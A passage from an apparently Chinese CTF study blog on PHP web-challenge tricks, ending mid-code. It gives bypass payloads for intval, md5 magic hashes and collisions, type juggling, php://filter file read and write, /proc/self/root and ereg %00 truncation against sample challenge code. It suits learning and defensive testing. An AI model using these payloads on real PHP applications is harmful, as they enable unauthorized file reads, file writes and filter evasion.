title="进制转换"></a>进制转换</h3><blockquote><p>0b?? : 二进制<br>0??? : 八进制<br>0X?? : 十六进制</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=010574</code></p><h3 id="小数点绕过"><a href="#小数点绕过" class="headerlink" title="小数点绕过"></a>小数点绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476.0</code></p><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strpos</span>() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line"><span class="title function_ invoke__">stripos</span>() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</span><br><span class="line"><span class="title function_ invoke__">strrpos</span>() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</span><br><span class="line"><span class="title function_ invoke__">strripos</span>() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br></pre></td></tr></table></figure><ul><li>利用+代替空格绕过</li></ul><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ul><li><a href="https://www.freesion.com/article/53561386476/">md5绕过</a></li></ul><h3 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h3><ul><li><p>只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等</p></li><li><p>在这样的弱比较里，0e开头的会被识别成科学计数法，结果均为0，比较时<code>0=0</code>为true绕过</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">240610708</span>:<span class="number">0e462097431906509019562988736854</span></span><br><span class="line">QLTHNDT:<span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO:<span class="number">0e830400451993494058024219903391</span></span><br><span class="line">PJNPDWY:<span class="number">0e291529052894702774557631701704</span></span><br><span class="line">NWWKITQ:<span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF:<span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MMHUWUV:<span class="number">0e701732711630150438129209816536</span></span><br><span class="line">MAUXXQC:<span class="number">0e478478466848439040434801845361</span></span><br></pre></td></tr></table></figure><h3 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h3><ul><li>数组绕过</li><li>如果传入的不是字符串而是数组，不但md5()函数不会报错，结果还会返回null，在强比较里面<code>null=null</code>为true绕过</li></ul><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;])===md5($_GET[&#x27;b&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真实md5碰撞，因为此时不能输入数组了，只能输入字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><ul><li><p>搜索数组中是否存在指定的值。</p></li><li><p>没有设置第三个参数时就可以形成自动转换</p></li><li><p><code>eg:x=1.php自动转换为1</code></p></li></ul><h1 id="php弱比较"><a href="#php弱比较" class="headerlink" title="php弱比较"></a>php弱比较</h1><h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><ul><li>显示变量相关信息</li><li>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<ul><li>如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</li></ul></li></ul><h2 id="字符串和数字比较"><a href="#字符串和数字比较" class="headerlink" title="字符串和数字比较"></a>字符串和数字比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;a&#x27;</span> == <span class="number">0</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;1a&#x27;</span> == <span class="number">1</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;12a&#x27;</span> == <span class="number">1</span>);<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure><ul><li>会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成false，false又和0弱类型比较是相等的，所以第一个是true。</li><li>但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。</li></ul><h2 id="布尔true和任意比较"><a href="#布尔true和任意比较" class="headerlink" title="布尔true和任意比较"></a>布尔true和任意比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="number">0</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="string">&#x27;False&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(True == <span class="number">2</span>);<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><ul><li>bool 1和任何比较都相等，除了0和false，因为0也认为是bool false，true是不等于false的，所以第一条是false，其余的全是true。</li></ul><h2 id="hash值和字符串“0”比较"><a href="#hash值和字符串“0”比较" class="headerlink" title="hash值和字符串“0”比较"></a>hash值和字符串“0”比较</h2><ul><li>hash: 哈希算法</li><li>特点：<ul><li>对于特定的hash算法输出结果的长度总是一定的；</li><li>对于相同的输入内容不管执行多少次hash函数，总会得到相同的hash值；</li><li>对于输入字符串哪怕及其微小的变动也会引起输出结果巨大的变化</li><li>哈希过程是单向的，即不能通过特定的函数从hash值恢复出原始数据。</li></ul></li><li>常见的hash算法: MD5、SHA1、SHA224、SHA256、SHA512等</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>);<span class="comment">//0cc175b9c0f1b6a831c399e269772661</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str1</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;s224534898e&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>);<span class="comment">//0e420233178946742799316739797882</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str2</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(true)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&#x27;a1b2edaced&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str3</span>);<span class="comment">//0e45ea817f33691a3dd1f46af81166c4bool</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str3</span>) == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(false)</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0e111111111111&#x27;</span> == <span class="string">&#x27;0&#x27;</span>);<span class="comment">//bool(true) </span></span><br></pre></td></tr></table></figure><ul><li>只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。</li><li>所以当hash出来的32个值，开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的。</li><li>第一条只是0开头，所以只能当普通字符串，结果为false。</li><li>第二条0e后面全为数字，符合要求，结果为true。</li><li>第三条虽然为0e，但是后面不全为数字，所以结果为false。</li></ul><h1 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h1><h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h2><ul><li>&amp;&amp;与||的优先级高于=</li><li>=的优先级高于and与or</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bA</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$bB</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$b1</span> = <span class="variable">$bA</span> <span class="keyword">and</span> <span class="variable">$bB</span>;</span><br><span class="line"><span class="variable">$b2</span> = <span class="variable">$bA</span> &amp;&amp; <span class="variable">$bB</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b1</span>); <span class="comment">// $b1 = true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b2</span>); <span class="comment">// $b2 = false</span></span><br><span class="line"><span class="variable">$bA</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$bB</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b3</span> = <span class="variable">$bA</span> <span class="keyword">or</span> <span class="variable">$bB</span>;</span><br><span class="line"><span class="variable">$b4</span> = <span class="variable">$bA</span> || <span class="variable">$bB</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b3</span>); <span class="comment">// $b3 = false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b4</span>); <span class="comment">// $b4 = true</span></span><br></pre></td></tr></table></figure><h2 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h2><blockquote><p>http协议默认先以get方式获取数据，无论是否以哪种方式发起的，总是get方式优先，即通过get方式获取到了数据就不会再去通过post方式获取一遍，如果get方式获取不到，再以post方式获取。</p></blockquote><h1 id="ReflectionClass反射类"><a href="#ReflectionClass反射类" class="headerlink" title="ReflectionClass反射类"></a>ReflectionClass反射类</h1><ul><li>可以和system连用：<br><code>Reflectionclass(system(&#39;cat ls&#39;));</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  <span class="comment">//获取一组常量</span></span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    <span class="comment">//获取类名</span></span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); <span class="comment">//获取静态属性</span></span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); <span class="comment">//获取类中的方法</span></span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="call-user-func回调函数"><a href="#call-user-func回调函数" class="headerlink" title="call_user_func回调函数"></a>call_user_func回调函数</h1><ul><li>call_user_func(callback,parameter)：<br>callback：被调用的回调函数，其余参数是回调函数的参数，尝试用hex2bin()作为回调函数（16进制转化为ASCII 字符）</li><li>call_user_func()来调用一个类里面的方法<ul><li><code>call_user_func(array($classname, &#39;say_hello&#39;));</code><br>将调用$calssname类里面的<code>say_hello</code>的方法</li></ul></li></ul><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><ul><li>配合file_put_contents(v3,str);函数 //在需要base64转换的时候</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php&amp;str=......</span></span><br></pre></td></tr></table></figure><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通常使用：</li></ul><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><ul><li>当ban掉base64的时候，我们还可以用其他编码方式（或者不编码）：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php//可打印字符引用编码</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php//压缩流</span></span><br></pre></td></tr></table></figure><h1 id="is-file-函数"><a href="#is-file-函数" class="headerlink" title="is_file()函数"></a>is_file()函数</h1><ul><li>判断是否为文件</li></ul><h2 id="php伪协议绕过"><a href="#php伪协议绕过" class="headerlink" title="php伪协议绕过"></a>php伪协议绕过</h2><blockquote><p>highlight_file()可以识别php伪协议 is_file()不能识别php伪协议</p></blockquote><h2 id="proc-self-root"><a href="#proc-self-root" class="headerlink" title="/proc/self/root"></a>/proc/self/root</h2><blockquote><p>在linux中/proc/self/root是指向根目录的 也就是如果在命令行中输入 ls /proc/self/root<br>其实显示的内容是根目录下的内容<br>多次重复后绕过is_file</p></blockquote><p><code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><h1 id="ereg-截断漏洞"><a href="#ereg-截断漏洞" class="headerlink" title="ereg()截断漏洞"></a>ereg()截断漏洞</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: c=a%00778</code>    反转后：c=877=0x36d</p><ul><li>strrev()：<br>反转字符串，常出现在%00截断漏洞中<br>注：%00是一个整体，不会反转成00% </li></ul><h1 id="Exception异常处理类"><a href="#Exception异常处理类" class="headerlink" title="Exception异常处理类"></a>Exception异常处理类</h1><ul><li>和ReflectionClass反射类用法相似，该类中常用的成员函数如下所示：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getMessage</span>()：返回异常的消息内容；</span><br><span class="line"><span class="title function_ invoke__">getCode</span>()：以数字形式返回异常代码；</span><br><span class="line"><span class="title function_ invoke__">getFile</span>()：返回发生异常的文件名；</span><br><span class="line"><span class="title function_ invoke__">getLine</span>()：返回发生错误的代码行号；</span><br><span class="line"><span class="title function_ invoke__">getTrace</span>()：返回 <span class="title function_ invoke__">backtrace</span>() 数组；</span><br><span class="line"><span class="title function_ invoke__">getTraceAsString</span>()：返回已格式化成字符串的、由函数 <span class="title function_ invoke__">getTrace</span>() 函数所产生的信息；</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()：产生异常的字符串信息，它可以重载。注意，该函数最前部是两个下划线。</span><br></pre></td></tr></table></figure><h1 id="FilesystemIterator类读取文件"><a href="#FilesystemIterator类读取文件" class="headerlink" title="FilesystemIterator类读取文件"></a>FilesystemIterator类读取文件</h1><ul><li>FilesystemIterator获取指定目录下的所有文件</li><li>getcwd()函数：获取当前工作目录 返回当前工作目录</li></ul><p><code>FilesystemIterator(getcwd());</code></p><h1 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h1><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//当前运行的文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//本地地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//所在服务器的主机名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//请求页面时HTTP(通信协议)的名称和版本</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//访问页面使用的请求方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//运行文件的所在目录（绝对路径）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//当前请求头中 Accept-Language</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//运行文件的文件名（绝对路径）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>];<span class="comment">//当前运行的脚本的文件、</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];<span class="comment">//URI 用来指定要访问的页面。</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>，http:<span class="comment">//localhost/aaa/ 